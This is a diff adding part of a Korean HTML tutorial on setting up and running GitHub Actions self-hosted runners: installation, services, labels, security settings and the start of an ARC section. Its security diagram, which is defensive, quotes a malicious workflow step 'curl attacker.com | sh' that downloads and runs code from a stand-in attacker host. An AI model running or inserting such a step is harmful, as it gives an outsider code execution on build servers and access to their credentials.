+    --unattended
+<span class="c-out">--------------------------------------------------------------------------------
+|        ____ _ _   _   _       _          _        _   _                      |
+|       / ___(_) |_| | | |_   _| |__      / \   ___| |_(_) ___  _ __  ___       |
+--------------------------------------------------------------------------------
+√ Connected to GitHub
+√ Runner successfully added
+√ Runner connection is good
+√ Settings Saved.</span>
+
+<span class="c-cm"># ── 4) 포그라운드 실행 (동작 확인용) ──────────────────────</span>
+<span class="c-pr">$ </span>./run.sh
+<span class="c-out">√ Connected to GitHub
+Current runner version: '2.32x.x'
+Listening for Jobs</span>
+<span class="c-cm"># ↑ "Listening for Jobs"가 보이면 성공. GitHub Settings → Runners에서 🟢 Idle 확인</span></pre></div>
+
+    <div class="pane"><pre><span class="c-cm"># RHEL / Rocky / CentOS 계열은 .NET 의존 패키지를 먼저 깔아야 합니다</span>
+<span class="c-pr">$ </span>sudo dnf install -y libicu krb5-libs zlib openssl-libs \
+                     lttng-ust curl-minimal tar git
+
+<span class="c-cm"># SELinux가 Enforcing이면 러너 디렉터리 컨텍스트 확인</span>
+<span class="c-pr">$ </span>getenforce
+<span class="c-out">Enforcing</span>
+<span class="c-pr">$ </span>sudo semanage fcontext -a -t bin_t <span class="c-st">"/opt/actions-runner(/.*)?"</span>
+<span class="c-pr">$ </span>sudo restorecon -Rv /opt/actions-runner
+
+<span class="c-cm"># 이후 다운로드/등록 절차는 Ubuntu 탭과 동일</span>
+<span class="c-pr">$ </span><span class="c-kw">cd</span> /opt/actions-runner &amp;&amp; ./config.sh --url ... --token ...
+
+<span class="c-cm"># ── 폐쇄망: 프록시를 거쳐야 하는 경우 ─────────────────────</span>
+<span class="c-cm"># .env 파일에 넣으면 러너 서비스에도 자동 적용됩니다</span>
+<span class="c-pr">$ </span><span class="c-kw">cat</span> &gt; /opt/actions-runner/.env &lt;&lt;<span class="c-st">'EOF'</span>
+<span class="c-st">https_proxy=http://proxy.corp.local:3128
+http_proxy=http://proxy.corp.local:3128
+no_proxy=localhost,127.0.0.1,.corp.local,10.0.0.0/8</span>
+<span class="c-st">EOF</span>
+
+<span class="c-cm"># 사내 CA 인증서를 쓰는 SSL 인터셉트 환경이면 신뢰 저장소에 추가</span>
+<span class="c-pr">$ </span>sudo cp corp-root-ca.crt /etc/pki/ca-trust/source/anchors/
+<span class="c-pr">$ </span>sudo update-ca-trust extract</pre></div>
+
+    <div class="pane"><pre><span class="c-cm"># PowerShell (관리자 권한으로 폴더 생성만, 등록은 일반 계정 권장)</span>
+<span class="c-pr">PS&gt; </span>New-Item -ItemType Directory -Path C:\actions-runner -Force
+<span class="c-pr">PS&gt; </span>Set-Location C:\actions-runner
+
+<span class="c-cm"># 1) 다운로드 (버전은 GitHub Runners 화면의 안내값 사용)</span>
+<span class="c-pr">PS&gt; </span>$V = <span class="c-st">"2.32x.x"</span>
+<span class="c-pr">PS&gt; </span>Invoke-WebRequest -UseBasicParsing `
+      -Uri <span class="c-st">"https://github.com/actions/runner/releases/download/v$V/actions-runner-win-x64-$V.zip"</span> `
+      -OutFile <span class="c-st">"runner.zip"</span>
+
+<span class="c-cm"># 2) 압축 해제</span>
+<span class="c-pr">PS&gt; </span>Expand-Archive -Path runner.zip -DestinationPath . -Force
+
+<span class="c-cm"># 3) 등록</span>
+<span class="c-pr">PS&gt; </span>.\config.cmd --url https://github.com/my-company/web-service `
+      --token AXXXXXXXXXXXXXXXXXXXXXXXXXX `
+      --name build-win-01 `
+      --labels self-hosted,Windows,X64,msbuild `
+      --unattended
+
+<span class="c-cm"># 4) Windows 서비스로 설치 — 재부팅 후 자동 시작</span>
+<span class="c-pr">PS&gt; </span>.\config.cmd --runasservice
+<span class="c-pr">PS&gt; </span>Get-Service <span class="c-st">"actions.runner.*"</span>
+<span class="c-out">Status   Name                               DisplayName
+------   ----                               -----------
+Running  actions.runner.my-company-web-...  GitHub Actions Runner (...)</span>
+
+<span class="c-cm"># 긴 경로 문제 예방 (Windows 빌드 실패 1위 원인)</span>
+<span class="c-pr">PS&gt; </span>Set-ItemProperty <span class="c-st">'HKLM:\SYSTEM\CurrentControlSet\Control\FileSystem'</span> `
+      -Name LongPathsEnabled -Value <span class="c-nu">1</span>
+<span class="c-pr">PS&gt; </span>git config --system core.longpaths <span class="c-kw">true</span></pre></div>
+
+    <div class="pane"><pre><span class="c-cm"># macOS (Apple Silicon = osx-arm64, Intel = osx-x64)</span>
+<span class="c-pr">$ </span>mkdir -p ~/actions-runner &amp;&amp; <span class="c-kw">cd</span> ~/actions-runner
+<span class="c-pr">$ </span>V=<span class="c-st">"2.32x.x"</span>
+<span class="c-pr">$ </span>curl -O -L <span class="c-st">"https://github.com/actions/runner/releases/download/v$V/actions-runner-osx-arm64-$V.tar.gz"</span>
+<span class="c-pr">$ </span>tar xzf <span class="c-st">"actions-runner-osx-arm64-$V.tar.gz"</span>
+
+<span class="c-pr">$ </span>./config.sh --url https://github.com/my-company/ios-app \
+    --token AXXXXXXXXXXXXXXXXXXXXXXXXXX \
+    --labels self-hosted,macOS,ARM64,xcode-16 --unattended
+
+<span class="c-cm"># launchd 서비스로 등록 (재부팅 후 자동 시작)</span>
+<span class="c-pr">$ </span>./svc.sh install
+<span class="c-pr">$ </span>./svc.sh start
+<span class="c-pr">$ </span>./svc.sh status
+
+<span class="c-cm"># ⚠️ macOS 러너는 GUI 세션 의존 작업(시뮬레이터, 코드사인)이 많아</span>
+<span class="c-cm">#    로그인 세션이 유지되는 사용자로 실행해야 안정적입니다.</span>
+<span class="c-cm">#    keychain 잠금 해제도 필요할 수 있습니다:</span>
+<span class="c-pr">$ </span>security unlock-keychain -p <span class="c-st">"$KEYCHAIN_PW"</span> ~/Library/Keychains/login.keychain-db</pre></div>
+  </div>
+
+  <div class="note"><span class="cal-t">기본 라벨은 자동 부여</span>
+    등록만 하면 <code>self-hosted</code>, OS 라벨(<code>Linux</code>/<code>Windows</code>/<code>macOS</code>),
+    아키텍처 라벨(<code>X64</code>/<code>ARM64</code>)이 <b>자동</b>으로 붙습니다.
+    <code>--labels</code>에 적는 값은 <b>여기에 더해지는</b> 커스텀 라벨(<code>gpu</code>, <code>docker</code>, <code>prod-deploy</code> 등)입니다.
+  </div>
+</section>
+
+<!-- ============ 07 ============ -->
+<section id="s7">
+  <div class="sec-head"><div class="sec-num">07</div>
+    <div><h2>서비스로 상시 운영하기</h2>
+    <div class="sec-sub"><code>./run.sh</code>를 터미널에서 띄워두면 SSH 끊길 때 함께 죽습니다</div></div>
+  </div>
+
+  <p>
+    실습은 <code>./run.sh</code>로 충분하지만, 운영에서는 <b>반드시</b> 서비스로 등록해 재부팅 후 자동 복구되게 해야 합니다.
+    러너 패키지에 포함된 <code>svc.sh</code>가 systemd 유닛을 자동으로 만들어 줍니다.
+  </p>
+
+  <div class="code">
+    <div class="code-bar"><div class="tabs">
+      <button class="tab active" onclick="tab(this,0)">svc.sh (권장)</button>
+      <button class="tab" onclick="tab(this,1)">systemd 유닛 직접 작성</button>
+      <button class="tab" onclick="tab(this,2)">상태 확인 · 로그</button>
+    </div><button class="copy" onclick="cp(this)">복사</button></div>
+
+    <div class="pane active"><pre><span class="c-cm"># svc.sh는 root 권한으로 실행 (내부에서 실행 계정을 지정)</span>
+<span class="c-pr">$ </span><span class="c-kw">cd</span> /opt/actions-runner
+<span class="c-pr">$ </span>sudo ./svc.sh install actions      <span class="c-cm"># ← actions 계정으로 실행되도록 등록</span>
+<span class="c-out">Creating launch runner in /etc/systemd/system/actions.runner.my-company-web-service.build-linux-01.service
+Run as user: actions
+Created symlink ...</span>
+
+<span class="c-pr">$ </span>sudo ./svc.sh start
+<span class="c-pr">$ </span>sudo ./svc.sh status
+<span class="c-out">● actions.runner.my-company-web-service.build-linux-01.service
+     Active: active (running) since Wed 2026-08-12 09:14:22 KST; 8s ago</span>
+
+<span class="c-cm"># 중지 / 서비스 제거</span>
+<span class="c-pr">$ </span>sudo ./svc.sh stop
+<span class="c-pr">$ </span>sudo ./svc.sh uninstall</pre></div>
+
+    <div class="pane"><pre><span class="c-cm"># svc.sh를 못 쓰는 특수 환경에서만 사용 (예: 세밀한 리소스 제한 필요)</span>
+<span class="c-pr">$ </span>sudo tee /etc/systemd/system/gh-runner.service &gt; /dev/null &lt;&lt;<span class="c-st">'EOF'</span>
+<span class="c-st">[Unit]
+Description=GitHub Actions Self-Hosted Runner
+After=network-online.target docker.service
+Wants=network-online.target
+
+[Service]
+Type=simple
+User=actions
+Group=actions
+WorkingDirectory=/opt/actions-runner
+ExecStart=/opt/actions-runner/run.sh
+Restart=always
+RestartSec=10
+KillMode=process
+KillSignal=SIGTERM
+TimeoutStopSec=5min          # 진행 중 잡을 마칠 시간을 준다
+EnvironmentFile=-/opt/actions-runner/.env
+
+# 리소스 가드레일 — 러너가 호스트를 잡아먹지 않게
+CPUQuota=400%
+MemoryMax=12G
+TasksMax=4096
+
+[Install]
+WantedBy=multi-user.target</span>
+<span class="c-st">EOF</span>
+
+<span class="c-pr">$ </span>sudo systemctl daemon-reload
+<span class="c-pr">$ </span>sudo systemctl enable --now gh-runner</pre></div>
+
+    <div class="pane"><pre><span class="c-cm"># 서비스 상태 (유닛 이름은 actions.runner.<스코프>.<러너명>.service)</span>
+<span class="c-pr">$ </span>systemctl list-units <span class="c-st">'actions.runner.*'</span>
+<span class="c-pr">$ </span>sudo systemctl status <span class="c-st">'actions.runner.*'</span> --no-pager
+
+<span class="c-cm"># 실시간 로그 (systemd journal)</span>
+<span class="c-pr">$ </span>sudo journalctl -u <span class="c-st">'actions.runner.*'</span> -f --no-pager
+
+<span class="c-cm"># 러너 자체 로그 — 문제 분석의 1차 자료</span>
+<span class="c-pr">$ </span>ls -lt /opt/actions-runner/_diag/ | head
+<span class="c-out">Runner_20260812-091422-utc.log     ← 에이전트(리스너) 로그
+Worker_20260812-093010-utc.log     ← 개별 잡 실행 로그</span>
+
+<span class="c-pr">$ </span>tail -f /opt/actions-runner/_diag/Runner_*.log
+
+<span class="c-cm"># 워크스페이스 위치 — 체크아웃된 코드가 여기 남아있다</span>
+<span class="c-pr">$ </span>tree -L 2 /opt/actions-runner/_work
+<span class="c-out">_work
+├── web-service          ← 리포지토리별 디렉터리
+│   └── web-service      ← 실제 체크아웃 ($GITHUB_WORKSPACE)
+├── _temp
+├── _actions             ← 다운로드된 액션 캐시
+└── _tool                ← setup-node 등이 설치한 툴체인</span></pre></div>
+  </div>
+
+  <div class="warn"><span class="cal-t">Restart=always의 함정</span>
+    등록 정보(<code>.credentials</code>)가 깨졌거나 러너가 GitHub에서 삭제된 상태면
+    systemd가 무한 재시작 루프에 빠져 <b>로그만 폭증</b>합니다.
+    <code>journalctl</code>에 같은 에러가 10초 간격으로 반복되면 재시작이 아니라 <b>재등록</b>이 답입니다.
+  </div>
+</section>
+<!-- ============ 08 ============ -->
+<section id="s8">
+  <div class="sec-head"><div class="sec-num">08</div>
+    <div><h2>워크플로우 연결과 라벨 설계</h2>
+    <div class="sec-sub"><code>runs-on</code> 한 줄이 트래픽 라우팅 규칙입니다</div></div>
+  </div>
+
+  <h3>첫 확인용 워크플로우</h3>
+  <p>러너가 살아있는지 검증하는 최소 워크플로우입니다. <code>.github/workflows/runner-check.yml</code>로 저장하고 수동 실행하세요.</p>
+  <div class="code">
+    <div class="code-bar"><div class="tabs">
+      <button class="tab active" onclick="tab(this,0)">runner-check.yml</button>
+      <button class="tab" onclick="tab(this,1)">runs-on 문법 5가지</button>
+      <button class="tab" onclick="tab(this,2)">혼합 전략 실전 예</button>
+    </div><button class="copy" onclick="cp(this)">복사</button></div>
+
+    <div class="pane active"><pre><span class="c-yk">name</span>: <span class="c-st">러너 상태 점검</span>
+<span class="c-yk">on</span>:
+  <span class="c-yk">workflow_dispatch</span>:        <span class="c-cm"># Actions 탭에서 수동 실행 버튼 생성</span>
+
+<span class="c-yk">jobs</span>:
+  <span class="c-yk">check</span>:
+    <span class="c-yk">runs-on</span>: [<span class="c-st">self-hosted</span>, <span class="c-st">Linux</span>, <span class="c-st">X64</span>]   <span class="c-cm"># ← 라벨 AND 조건</span>
+    <span class="c-yk">timeout-minutes</span>: <span class="c-nu">10</span>                       <span class="c-cm"># 무한 대기 방지 (필수 습관)</span>
+    <span class="c-yk">steps</span>:
+      - <span class="c-yk">name</span>: <span class="c-st">러너 신원 확인</span>
+        <span class="c-yk">run</span>: |
+          <span class="c-kw">echo</span> <span class="c-st">"호스트명   : $(hostname)"</span>
+          <span class="c-kw">echo</span> <span class="c-st">"실행 계정  : $(whoami)"</span>
+          <span class="c-kw">echo</span> <span class="c-st">"러너 이름  : $RUNNER_NAME"</span>
+          <span class="c-kw">echo</span> <span class="c-st">"작업 경로  : $RUNNER_WORKSPACE"</span>
+          <span class="c-kw">echo</span> <span class="c-st">"OS/ARCH    : $RUNNER_OS / $RUNNER_ARCH"</span>
+
+      - <span class="c-yk">name</span>: <span class="c-st">디스크와 메모리 여유</span>
+        <span class="c-yk">run</span>: |
+          df -h / | tail -1
+          free -h | head -2
+
+      - <span class="c-yk">name</span>: <span class="c-st">사내망 접근 확인 (self-hosted의 존재 이유)</span>
+        <span class="c-yk">run</span>: curl -sS -m <span class="c-nu">5</span> -o /dev/null -w <span class="c-st">"harbor: %{http_code}\n"</span> https://harbor.corp.local
+
+      - <span class="c-yk">name</span>: <span class="c-st">소스 체크아웃</span>
+        <span class="c-yk">uses</span>: <span class="c-st">actions/checkout@v4</span>
+
+      - <span class="c-yk">name</span>: <span class="c-st">작업 후 정리 (러너는 재사용되므로 중요)</span>
+        <span class="c-yk">if</span>: <span class="c-st">always()</span>
+        <span class="c-yk">run</span>: <span class="c-kw">echo</span> <span class="c-st">"cleanup done"</span></pre></div>
+
+    <div class="pane"><pre><span class="c-cm"># ① GitHub-hosted (비교용)</span>
+<span class="c-yk">runs-on</span>: <span class="c-st">ubuntu-latest</span>
+
+<span class="c-cm"># ② self-hosted 아무 러너나 (권장하지 않음 — Windows 러너가 잡을 수 있음)</span>
+<span class="c-yk">runs-on</span>: <span class="c-st">self-hosted</span>
+
+<span class="c-cm"># ③ 라벨 AND 조합 — 실무 기본형</span>
+<span class="c-yk">runs-on</span>: [<span class="c-st">self-hosted</span>, <span class="c-st">Linux</span>, <span class="c-st">X64</span>, <span class="c-st">gpu</span>]
+
+<span class="c-cm"># ④ Runner Group 지정 (Org/Enterprise 러너)</span>
+<span class="c-yk">runs-on</span>:
+  <span class="c-yk">group</span>: <span class="c-st">prod-deploy-pool</span>
+  <span class="c-yk">labels</span>: [<span class="c-st">self-hosted</span>, <span class="c-st">Linux</span>]
+
+<span class="c-cm"># ⑤ ARC(Kubernetes) 러너 스케일셋 — 스케일셋 이름 자체가 라벨</span>
+<span class="c-yk">runs-on</span>: <span class="c-st">arc-runner-set</span>
+
+<span class="c-cm"># ⑥ 매트릭스로 여러 아키텍처 동시 빌드</span>
+<span class="c-yk">strategy</span>:
+  <span class="c-yk">matrix</span>:
+    <span class="c-yk">arch</span>: [<span class="c-st">X64</span>, <span class="c-st">ARM64</span>]
+<span class="c-yk">runs-on</span>: [<span class="c-st">self-hosted</span>, <span class="c-st">Linux</span>, <span class="c-st">"${{ matrix.arch }}"</span>]</pre></div>
+
+    <div class="pane"><pre><span class="c-yk">name</span>: <span class="c-st">CI/CD 파이프라인</span>
+<span class="c-yk">on</span>: [<span class="c-st">push</span>, <span class="c-st">pull_request</span>]
+
+<span class="c-yk">jobs</span>:
+  <span class="c-cm"># 1) 가벼운 검사는 GitHub-hosted로 — 우리 서버를 쓸 이유가 없다</span>
+  <span class="c-yk">lint</span>:
+    <span class="c-yk">runs-on</span>: <span class="c-st">ubuntu-latest</span>
+    <span class="c-yk">steps</span>:
+      - <span class="c-yk">uses</span>: <span class="c-st">actions/checkout@v4</span>
+      - <span class="c-yk">run</span>: <span class="c-st">npm ci &amp;&amp; npm run lint</span>
+
+  <span class="c-cm"># 2) 무거운 빌드는 캐시가 살아있는 self-hosted로</span>
+  <span class="c-yk">build</span>:
+    <span class="c-yk">needs</span>: <span class="c-st">lint</span>
+    <span class="c-yk">runs-on</span>: [<span class="c-st">self-hosted</span>, <span class="c-st">Linux</span>, <span class="c-st">docker</span>]
+    <span class="c-yk">timeout-minutes</span>: <span class="c-nu">40</span>
+    <span class="c-yk">steps</span>:
+      - <span class="c-yk">uses</span>: <span class="c-st">actions/checkout@v4</span>
+      - <span class="c-yk">run</span>: docker build -t harbor.corp.local/app:${{ github.sha }} .
+
+  <span class="c-cm"># 3) 사내망 배포는 전용 러너 + 환경 승인 게이트</span>
+  <span class="c-yk">deploy</span>:
+    <span class="c-yk">needs</span>: <span class="c-st">build</span>
+    <span class="c-yk">if</span>: <span class="c-st">github.ref == 'refs/heads/main'</span>
+    <span class="c-yk">runs-on</span>:
+      <span class="c-yk">group</span>: <span class="c-st">prod-deploy-pool</span>
+      <span class="c-yk">labels</span>: [<span class="c-st">self-hosted</span>, <span class="c-st">deploy</span>]
+    <span class="c-yk">environment</span>: <span class="c-st">production</span>     <span class="c-cm"># 승인자 지정 가능</span>
+    <span class="c-yk">concurrency</span>:                <span class="c-cm"># 동시 배포 방지</span>
+      <span class="c-yk">group</span>: <span class="c-st">deploy-prod</span>
+      <span class="c-yk">cancel-in-progress</span>: <span class="c-kw">false</span>
+    <span class="c-yk">steps</span>:
+      - <span class="c-yk">run</span>: kubectl -n prod set image deploy/app app=harbor.corp.local/app:${{ github.sha }}</pre></div>
+  </div>
+
+  <h3>라벨 설계 원칙</h3>
+  <div class="tw"><table>
+    <thead><tr><th style="width:26%">라벨 종류</th><th style="width:30%">예시</th><th>목적</th></tr></thead>
+    <tbody>
+      <tr><td><strong>자동 부여</strong></td><td><code>self-hosted</code> <code>Linux</code> <code>X64</code></td><td>건드리지 말고 그대로 사용</td></tr>
+      <tr><td><strong>능력(capability)</strong></td><td><code>docker</code> <code>gpu</code> <code>node20</code> <code>xcode-16</code></td><td>"이 잡을 실행할 수 있는가"를 표현 — 가장 중요</td></tr>
+      <tr><td><strong>용도(purpose)</strong></td><td><code>build</code> <code>test</code> <code>deploy</code></td><td>배포 전용 러너를 논리적으로 분리</td></tr>
+      <tr><td><strong>환경(env)</strong></td><td><code>dev</code> <code>stg</code> <code>prod</code></td><td>운영 러너에 개발 잡이 흘러들지 않게</td></tr>
+      <tr><td><strong>피해야 할 것</strong></td><td><code>server-192-168-1-11</code> <code>chulsoo-pc</code></td><td>호스트명·개인명 라벨 → 서버 교체 시 워크플로우 전부 수정</td></tr>
+    </tbody>
+  </table></div>
+
+  <div class="tip"><span class="cal-t">신입이 자주 겪는 함정</span>
+    라벨은 <b>대소문자를 구분하지 않지만</b>, 오타는 구분합니다. <code>ubuntu-latest</code>를 self-hosted 러너에 라벨로 붙이는 건
+    금지된 관행입니다(GitHub 예약 라벨과 충돌해 예측 불가한 라우팅 발생). 또한 러너가 <b>1대뿐이면 잡이 순차 실행</b>됩니다 —
+    PR이 몰리는 시간에 큐가 쌓이면 러너 대수를 늘리는 게 정답입니다.
+  </div>
+</section>
+
+<!-- ============ 09 ============ -->
+<section id="s9">
+  <div class="sec-head"><div class="sec-num">09</div>
+    <div><h2>보안: 반드시 지켜야 하는 규칙</h2>
+    <div class="sec-sub">Self-hosted runner는 "내 서버에서 남의 코드를 실행하는" 구조입니다</div></div>
+  </div>
+
+  <div class="danger"><span class="cal-t">1순위 규칙</span>
+    <b>Public 리포지토리에 self-hosted runner를 연결하지 마세요.</b>
+    누구나 Fork → PR을 열 수 있고, 그 PR의 워크플로우 코드가 <b>내 서버에서 그대로 실행</b>됩니다.
+    러너 계정 권한, 사내망 접근, 캐시에 남은 자격증명이 전부 노출됩니다. GitHub 공식 문서에서도 명시적으로 경고하는 항목입니다.
+  </div>
+
+  <figure>
+  <svg viewBox="0 0 860 240" role="img" aria-label="포크 PR을 통한 러너 공격 경로">
+    <defs><marker id="ard" markerWidth="9" markerHeight="9" refX="7" refY="3" orient="auto">
+      <path d="M0,0 L7,3 L0,6 z" fill="#F2617A"/></marker></defs>
+    <rect x="12" y="70" width="150" height="90" rx="10" fill="#1A1016" stroke="#F2617A" stroke-opacity=".5"/>
+    <text x="87" y="100" class="svg-t" text-anchor="middle" fill="#F2617A">외부 공격자</text>
+    <text x="87" y="122" class="svg-s" text-anchor="middle">GitHub 계정만 있으면</text>
+    <text x="87" y="138" class="svg-s" text-anchor="middle">누구나 가능</text>
+
+    <rect x="200" y="70" width="170" height="90" rx="10" fill="#121A24" stroke="#22303F"/>
+    <text x="285" y="98" class="svg-t" text-anchor="middle">Fork &amp; PR 생성</text>
+    <text x="285" y="120" class="svg-s" text-anchor="middle">workflow에 악성 스텝 삽입</text>
+    <text x="285" y="136" class="svg-s" text-anchor="middle">run: curl attacker.com | sh</text>
+
+    <rect x="408" y="70" width="170" height="90" rx="10" fill="#121A24" stroke="#F5A524" stroke-opacity=".5"/>
+    <text x="493" y="98" class="svg-t" text-anchor="middle" fill="#F5A524">PR 트리거 실행</text>
+    <text x="493" y="120" class="svg-s" text-anchor="middle">승인 없이 자동 실행되면</text>
+    <text x="493" y="136" class="svg-s" text-anchor="middle">그대로 러너로 전달</text>
+
+    <rect x="616" y="46" width="232" height="138" rx="10" fill="#1A1016" stroke="#F2617A" stroke-opacity=".5"/>
+    <text x="732" y="74" class="svg-t" text-anchor="middle" fill="#F2617A">내 러너 = 침해 지점</text>
+    <text x="732" y="98" class="svg-s" text-anchor="middle">· 사내망 스캔 / 내부 API 호출</text>
+    <text x="732" y="116" class="svg-s" text-anchor="middle">· _work 캐시의 토큰 탈취</text>
+    <text x="732" y="134" class="svg-s" text-anchor="middle">· 다음 잡에 백도어 심기</text>
+    <text x="732" y="152" class="svg-s" text-anchor="middle">· 암호화폐 채굴 / 크립토재킹</text>
+    <text x="732" y="170" class="svg-s" text-anchor="middle">· 러너 계정 권한으로 측면 이동</text>
+
+    <line x1="164" y1="115" x2="196" y2="115" stroke="#F2617A" stroke-width="1.6" marker-end="url(#ard)"/>
+    <line x1="372" y1="115" x2="404" y2="115" stroke="#F2617A" stroke-width="1.6" marker-end="url(#ard)"/>
+    <line x1="580" y1="115" x2="612" y2="115" stroke="#F2617A" stroke-width="1.6" marker-end="url(#ard)" class="flowline"/>
+    <text x="430" y="212" class="svg-l" text-anchor="middle" fill="#6E7F93">방어: Private 리포에서만 사용 · 외부 기여자 워크플로우 승인 필수 · ephemeral 러너 · 컨테이너 격리</text>
+  </svg>
+  <figcaption>Public 리포 + self-hosted runner는 사실상 "인터넷에 셸을 공개"하는 것과 같습니다. 오픈소스 프로젝트는 GitHub-hosted를 쓰세요.</figcaption>
+  </figure>
+
+  <h3>체크해야 할 보안 설정 8가지</h3>
+  <div class="grid g2">
+    <div class="card"><div class="card-t">🔒 러너 자체</div>
+      <ul style="margin:0;font-size:14.4px;color:var(--text-2)">
+        <li><b>전용 일반 계정</b>으로 실행, root 금지, <code>sudoers</code> 무제한 등록 금지</li>
+        <li><b>--ephemeral</b> 사용 — 잡 1개 처리 후 러너 자동 해제 → 잡 간 오염 차단</li>
+        <li>컨테이너/VM 안에서 실행해 호스트와 격리</li>
+        <li>러너 버전 <b>자동 업데이트 활성</b> 유지(취약점 패치)</li>
+      </ul></div>
+    <div class="card"><div class="card-t">🛡 GitHub 설정</div>
+      <ul style="margin:0;font-size:14.4px;color:var(--text-2)">
+        <li>Settings → Actions → <b>Fork PR workflows: 승인 필요</b>로 변경</li>
+        <li><b>Runner Group</b>으로 러너를 쓸 수 있는 리포를 화이트리스트</li>
+        <li><code>permissions:</code>로 <code>GITHUB_TOKEN</code> 최소 권한(<code>contents: read</code>)</li>
+        <li>운영 배포는 <code>environment</code> + 승인자(reviewer) 게이트</li>
+      </ul></div>
+  </div>
+
+  <div class="code">
+    <div class="code-bar"><div class="tabs">
+      <button class="tab active" onclick="tab(this,0)">최소 권한 워크플로우</button>
+      <button class="tab" onclick="tab(this,1)">ephemeral 러너 자동 재등록</button>
+    </div><button class="copy" onclick="cp(this)">복사</button></div>
+    <div class="pane active"><pre><span class="c-yk">permissions</span>:            <span class="c-cm"># 워크플로우 전역 기본을 읽기 전용으로</span>
+  <span class="c-yk">contents</span>: <span class="c-st">read</span>
+
+<span class="c-yk">jobs</span>:
+  <span class="c-yk">deploy</span>:
+    <span class="c-yk">runs-on</span>: [<span class="c-st">self-hosted</span>, <span class="c-st">deploy</span>]
+    <span class="c-yk">permissions</span>:          <span class="c-cm"># 필요한 잡에만 개별 부여</span>
+      <span class="c-yk">contents</span>: <span class="c-st">read</span>
+      <span class="c-yk">id-token</span>: <span class="c-st">write</span>   <span class="c-cm"># OIDC로 클라우드 인증 → 장기 키 불필요</span>
+    <span class="c-yk">steps</span>:
+      - <span class="c-yk">uses</span>: <span class="c-st">actions/checkout@v4</span>
+        <span class="c-yk">with</span>:
+          <span class="c-yk">persist-credentials</span>: <span class="c-kw">false</span>   <span class="c-cm"># .git/config에 토큰 남기지 않음</span>
+      - <span class="c-yk">name</span>: <span class="c-st">Azure 로그인 (OIDC)</span>
+        <span class="c-yk">uses</span>: <span class="c-st">azure/login@v2</span>
+        <span class="c-yk">with</span>:
+          <span class="c-yk">client-id</span>: <span class="c-st">${{ secrets.AZURE_CLIENT_ID }}</span>
+          <span class="c-yk">tenant-id</span>: <span class="c-st">${{ secrets.AZURE_TENANT_ID }}</span>
+          <span class="c-yk">subscription-id</span>: <span class="c-st">${{ secrets.AZURE_SUBSCRIPTION_ID }}</span></pre></div>
+    <div class="pane"><pre><span class="c-cm">#!/usr/bin/env bash</span>
+<span class="c-cm"># ephemeral 러너 루프: 잡 1개 실행 → 등록 해제 → 재등록 → 반복</span>
+<span class="c-cm"># (실무에서는 ARC나 오토스케일링 그룹이 이 일을 대신합니다)</span>
+<span class="c-kw">set</span> -euo pipefail
+OWNER=<span class="c-st">"my-company"</span>; REPO=<span class="c-st">"web-service"</span>
+GH_PAT=<span class="c-st">"${GH_PAT:?PAT 환경변수 필요}"</span>
+
+<span class="c-kw">while</span> <span class="c-kw">true</span>; <span class="c-kw">do</span>
+  <span class="c-cm"># 1) 등록 토큰을 API로 새로 발급 (하드코딩 금지)</span>
+  TOKEN=$(curl -sS -X POST \
+    -H <span class="c-st">"Authorization: Bearer $GH_PAT"</span> \
+    -H <span class="c-st">"Accept: application/vnd.github+json"</span> \
+    <span class="c-st">"https://api.github.com/repos/$OWNER/$REPO/actions/runners/registration-token"</span> \
+    | jq -r .token)
+
+  <span class="c-cm"># 2) 일회용으로 등록</span>
+  ./config.sh --url <span class="c-st">"https://github.com/$OWNER/$REPO"</span> \
+              --token <span class="c-st">"$TOKEN"</span> \
+              --name <span class="c-st">"eph-$(hostname)-$RANDOM"</span> \
+              --labels self-hosted,Linux,X64,ephemeral \
+              --ephemeral --unattended --replace
+
+  <span class="c-cm"># 3) 잡 1개 실행 후 스스로 종료됨</span>
+  ./run.sh || <span class="c-kw">true</span>
+
+  <span class="c-cm"># 4) 워크스페이스 청소 후 다음 루프</span>
+  rm -rf _work/* || <span class="c-kw">true</span>
+  <span class="c-kw">sleep</span> <span class="c-nu">3</span>
+<span class="c-kw">done</span></pre></div>
+  </div>
+</section>
+
+<!-- ============ 10 ============ -->
+<section id="s10">
+  <div class="sec-head"><div class="sec-num">10</div>
+    <div><h2>컨테이너 · Kubernetes(ARC) 러너</h2>
+    <div class="sec-sub">러너를 손으로 늘리는 단계를 졸업하는 방법</div></div>
+  </div>
+
+  <p>
+    VM에 러너를 하나씩 설치하는 방식은 3~4대까지는 괜찮지만, 그 이상이면 <b>버전 관리·오염·스케일</b> 문제가 터집니다.
+    해답은 러너를 <b>일회용 컨테이너</b>로 만들고 오토스케일링하는 것입니다.
+  </p>
+
+  <figure>
+  <svg viewBox="0 0 860 300" role="img" aria-label="ARC 아키텍처 도해">
+    <defs><marker id="ak" markerWidth="9" markerHeight="9" refX="7" refY="3" orient="auto">
+      <path d="M0,0 L7,3 L0,6 z" fill="#34D3A6"/></marker>
+      <marker id="akc" markerWidth="9" markerHeight="9" refX="7" refY="3" orient="auto">
+      <path d="M0,0 L7,3 L0,6 z" fill="#7C93F5"/></marker></defs>
+    <rect x="12" y="70" width="176" height="140" rx="11" fill="#101825" stroke="#7C93F5" stroke-opacity=".4"/>
+    <text x="100" y="100" class="svg-t" text-anchor="middle" fill="#7C93F5">GitHub</text>
+    <text x="100" y="124" class="svg-s" text-anchor="middle">Runner Scale Set</text>
+    <text x="100" y="142" class="svg-s" text-anchor="middle">잡 큐</text>
+    <rect x="34" y="156" width="132" height="30" rx="6" fill="#0B111A" stroke="#F5A524" stroke-opacity=".45"/>
+    <text x="100" y="176" class="svg-s" text-anchor="middle" fill="#F5A524">대기 잡 5개</text>
+
+    <rect x="236" y="24" width="612" height="252" rx="12" fill="#0C1218" stroke="#22303F" stroke-dasharray="6 4"/>
+    <text x="254" y="48" class="svg-s" fill="#6E7F93">Kubernetes 클러스터 (온프렘 / EKS / AKS)</text>
+
+    <rect x="258" y="66" width="180" height="86" rx="9" fill="#121A24" stroke="#22303F"/>
+    <text x="348" y="92" class="svg-t" text-anchor="middle">ARC Controller</text>
+    <text x="348" y="112" class="svg-s" text-anchor="middle">ns: arc-systems</text>
+    <text x="348" y="130" class="svg-s" text-anchor="middle">Listener가 큐 감시</text>
+
+    <rect x="258" y="170" width="180" height="86" rx="9" fill="#121A24" stroke="#22303F"/>
+    <text x="348" y="196" class="svg-t" text-anchor="middle">AutoscalingRunnerSet</text>
+    <text x="348" y="216" class="svg-s" text-anchor="middle">minRunners: 1</text>
+    <text x="348" y="234" class="svg-s" text-anchor="middle">maxRunners: 20</text>
+
+    <rect x="480" y="66" width="164" height="86" rx="9" fill="#101B1B" stroke="#34D3A6" stroke-opacity=".5"/>
